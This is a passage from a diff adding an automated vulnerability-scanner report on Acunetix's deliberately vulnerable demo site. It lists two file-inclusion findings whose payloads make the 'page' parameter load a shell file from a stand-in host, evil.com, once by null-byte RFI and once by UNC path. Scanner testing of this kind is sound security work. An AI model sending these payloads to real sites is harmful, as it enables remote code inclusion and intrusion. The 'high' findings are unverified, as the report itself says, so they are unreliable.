+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:43</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>39. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=http%3A//evil.com/shell.txt%2500" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=http%3A//evil.com/shell.txt%2500</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - RFI with null byte in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>http://evil.com/shell.txt%00</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:44</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>40. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=%5Cevil.com%5Cshare%5Cshell.txt" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=%5Cevil.com%5Cshare%5Cshell.txt</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNC path injection in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>\evil.com\share\shell.txt</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:44</em></p>
+    </div>
+
+    <footer style="margin-top: 40px; padding: 20px 0; border-top: 1px solid #eee; font-size: 0.9em; color: #777;">
+        <p>Report generated by Advanced Vulnerability Scanner</p>
+        <p>Note: This is an automated report. Please verify all findings before taking action.</p>
+    </footer>
+</body>
+</html>
